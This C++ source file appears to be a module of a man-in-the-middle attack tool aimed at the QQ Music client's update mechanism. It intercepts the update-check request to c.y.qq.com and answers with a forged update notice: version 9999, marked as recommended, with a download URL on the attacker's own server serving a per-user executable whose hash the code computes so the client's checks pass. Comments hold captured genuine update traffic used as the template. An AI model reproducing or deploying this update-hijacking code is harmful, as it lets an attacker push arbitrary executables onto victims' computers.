
#include "qqMusic.h"
#include "PluginServer.h"
#include "../attacker.h"
#include "sslPublic.h"
#include "../Public.h"
#include "../attacker.h"
#include "../HttpPartial.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../version.h"
#include "../FileOper.h"
#include "PluginServer.h"
#include "../Utils/simpleJson.h"
#include "../cipher/Base64.h"

int gQQMusicFlag = 0;

int QQMusic::isQQMusic(const char * url, const char * host) {
	if (strstr(host,"c.y.qq.com") && strstr(url,"/pcupdate/fcgi-bin/fcg_update_player.fcg?"))
	{
		gQQMusicFlag = 1;
		return TRUE;
	}

	return FALSE;
}



int QQMusic::sendPlugin( char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {

	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	char * retformat =
"<command-lable-xwl78-qq-music>\r\n"
"<cmd value=\"1089\" verson=\"999\">\r\n"
"<result>0</result>\r\n"
"<update_strategy>2</update_strategy>\r\n"
"<reason></reason>\r\n"
"<httpdown>0</httpdown>\r\n"
"<update_info>\r\n"
"<item>\r\n"
"<list_count>1</list_count>\r\n"
"<module_type>QQMUSICNEW</module_type>\r\n"
"<module_version>%s</module_version>\r\n"
"<module_name>%s</module_name>\r\n"
"<module_patchnum>116</module_patchnum>\r\n"
"<module_buildnum>0</module_buildnum>\r\n"
"<module_description>MS7mrYzmiYvnlLXlj7Dnrpfms5Xmm7TmlrDvvIzmjqjojZDmm7TotLTlv4MKMi7pn7PmlYjljYfnuqfvvIzmlrDlop7nnaHnnKDpn7PmlYgKMy7mlrDlop7np6/liIbllYbln47vvIzlkKzmrYzmnInosarnpLwKNC7mgKfog73kvJjljJbvvIznqLPlrprmgKfmj5DljYfvvIzkvZPpqozmm7TmtYHnlYU=</module_description>\r\n"
"<module_size>%u</module_size>\r\n"
"<module_recommended>YES</module_recommended>\r\n"
"<module_filename>%s</module_filename>\r\n"
"<module_url>http://%s/%s</module_url>\r\n"
"<module_ws_url>https://%s/%s</module_ws_url>\r\n"
"<module_hash>%s</module_hash>\r\n"
"<module_signature>00142A823B25BE38554AD6E5681A26FFD33D6D400795082AA2F483D6C663293FF24885F3FF5138E9B541</module_signature>\r\n"
"</item>\r\n"
"</update_info>\r\n"
"</cmd>\r\n"
"</command-lable-xwl78-qq-music>";

	string ver = "9999";

	char modulever[256] = { 0 };
	int base64len = Base64::Base64Encode(modulever, (unsigned char*)ver.c_str(), ver.length());

	char modulename[256] = { 0 };
	base64len = Base64::Base64Encode(modulename, (unsigned char*)WEIXIN_PC_UPDATE_EXE_FILENAME, lstrlenA(WEIXIN_PC_UPDATE_EXE_FILENAME));

	string ip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;

	char szmd5[256] = { 0 };
	unsigned char hexmd5[256] = { 0 };
	string filename = Public::getUserPluginPath(lpssl->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, 1);

	char result[4096];
	int retlen = sprintf(result, retformat,ver.c_str(), modulever, filesize, modulename,
		ip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME, ip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME, szmd5);

	int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

	return responseLen;
}

/*
GET /music/clntupate/QQMusicForYQQ.exe HTTP/1.1
Accept: *//*
Accept-Language: zh-CN
Host: dldir1.qq.com
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Range: bytes=0-20480
Connection: Keep-Alive

ssl server data:HTTP/1.1 302 Found
Server: Tengine
Date: Tue, 01 Jan 2019 11:17:46 GMT
Content-Type: text/html
Content-Length: 258
Connection: keep-alive
Location: https://www.taobao.com/music/clntupate/QQMusicForYQQ.exe
*/


/*
GET /qqfile/qq/plugin/QzoneMusicInstall.exe HTTP/1.1
Host: dldir1.qq.com
Accept: *//*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Connection: Keep-Alive
Cache-Control: no-cache
Accept-Encoding: gzip, deflate

ssl first packet:GET /qqfile/qq/videomsg/VideoMsgInstall.exe HTTP/1.1
Host: dldir1.qq.com
Accept: *//*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Connection: Keep-Alive
Cache-Control: no-cache
Accept-Encoding: gzip, deflate

ssl first packet:GET /qqfile/polymorphicicon/ClientType20170411.zip HTTP/1.1
Host: dldir1.qq.com
Accept: *//*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Connection: Keep-Alive
Cache-Control: no-cache
Accept-Encoding: gzip, deflate

HTTP/1.1 200 OK
Content-Length: 36989
Last-Modified: Tue, 11 Apr 2017 01:45:20 GMT
Server: nws_4.2.1_midcache
Date: Mon, 25 Mar 2019 10:26:41 GMT
Cache-Control: max-age=600
Expires: Mon, 25 Mar 2019 10:36:41 GMT
Content-Type: application/zip
X-NWS-LOG-UUID: 11258364905623118043
X-NWS-UUID-VERIFY: 3882dc6896787be92de520351040acb1
Connection: keep-alive
X-Cache-Lookup: Cache Hit


*/


/*
GET /weixin/checkresupdate/beautyres_1532919270.zip HTTP/1.1
Host: 47.101.189.13
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9


c.y.qq.com/pcupdate/fcgi-bin/fcg_update_player.fcg?os=10&guid=A77F6B3B81F1EC3F6982F88AD35B974D&uin=0&cmd=QueryModuleUpdate&version=1&auto_update=1&module_type=QQMusic&local_version=1666&local_patchnum=0&local_buildnum=4879&hash_code=E930E4F5D1D49D8FA10A07F3C9E7390C&key=0CFE5A6D4B7DE2F69D959EE72EF8953135838104C5645ADF&mode=3&pcachetime=1585066764
GET /pcupdate/fcgi-bin/fcg_update_player.fcg?os=10&guid=A77F6B3B81F1EC3F6982F88AD35B974D&uin=0&cmd=QueryModuleUpdate&version=1&auto_update=1&module_type=QQMusic&local_version=1666&local_patchnum=0&local_buildnum=4879&hash_code=E930E4F5D1D49D8FA10A07F3C9E7390C&key=0CFE5A6D4B7DE2F69D959EE72EF8953135838104C5645ADF&mode=3&pcachetime=1585066764 HTTP/1.1
Accept: *//*
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Host: c.y.qq.com
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 24 Mar 2020 16:19:22 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
UUID: 492564746
Pragma: no-cache
Area: sh
Content-Encoding: gzip

HTTP
<command-lable-xwl78-qq-music>
<cmd value="1089" verson="100">
<result>0</result>
<update_strategy>2</update_strategy>
<reason></reason>
<httpdown>0</httpdown>
<update_info>
<item>
<list_count>1</list_count>
<module_type>QQMUSICNEW</module_type>
<module_version>1752</module_version>
<module_name>MTc1Mg==</module_name>
<module_patchnum>116</module_patchnum>
<module_buildnum>0</module_buildnum>
<module_description>MS7mrYzmiYvnlLXlj7Dnrpfms5Xmm7TmlrDvvIzmjqjojZDmm7TotLTlv4MKMi7pn7PmlYjljYfnuqfvvIzmlrDlop7nnaHnnKDpn7PmlYgKMy7mlrDlop7np6/liIbllYbln47vvIzlkKzmrYzmnInosarnpLwKNC7mgKfog73kvJjljJbvvIznqLPlrprmgKfmj5DljYfvvIzkvZPpqozmm7TmtYHnlYU=</module_description>
<module_size>55147504</module_size>
<module_recommended>YES</module_recommended>
<module_filename>UVFNdXNpY19TZXR1cF8xNzUy</module_filename>
<module_url>http://dldir1.qq.com/music/clntupate/QQMusic_Setup_1752.exe</module_url>
<module_ws_url>https://dldir1.qq.com/music/clntupate/QQMusic_Setup_1752.exe</module_ws_url>
<module_hash>eca543d2b5c7ed4f9cdc2b4c7882c649</module_hash>
<module_signature>00142A823B25BE38554AD6E5681A26FFD33D6D400795082AA2F483D6C663293FF24885F3FF5138E9B541</module_signature>
</item>
</update_info>
</cmd>
</command-lable-xwl78-qq-music>


*/